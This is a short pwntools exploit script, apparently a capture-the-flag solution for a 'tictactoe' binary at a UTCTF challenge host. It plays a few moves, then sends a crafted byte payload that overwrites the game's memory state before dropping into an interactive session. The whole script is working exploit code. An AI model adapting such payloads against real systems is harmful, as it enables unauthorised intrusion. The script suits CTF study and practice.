from pwn import *

gs = '''
b *main+2386
b *main+2868
b *main+2831
continue
'''

elf = context.binary = ELF("./tictactoe")

def start():
    if args.REMOTE:
        return remote("challenge.utctf.live", 7114)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

#io.sendlineafter("Choose x or o: ", b"x")

io.sendline(b"x")

#io.sendlineafter("Enter 1-9 to select a spot: ", b"5\x00o")

#io.sendline(b"5\x00o\x00 ox\x01")

io.sendline(b"5")


io.recv()

io.sendline(b"3")

io.recv()

io.sendline(b"4")

io.recv()

payload = b"".join([
    b"\x38\x00\x34\x00\x33",
    p64(0x786f200078003500),
    p64(0x0000000100000001),
    p64(0x0000000200000002),
    p64(0x0000000100000002),
    p64(0x0000000000000001), # Aqui papure
    p64(0x0000000000000001),
    p64(0x0000000300000007),
    p64(0x0000000400000002),
    p64(0x0000000000000001), # Esto es decisivo ojito
    p64(0x0000000200000041)
])
input("PAUSE")
io.sendline(payload)
#io.sendline(b"8")

io.interactive()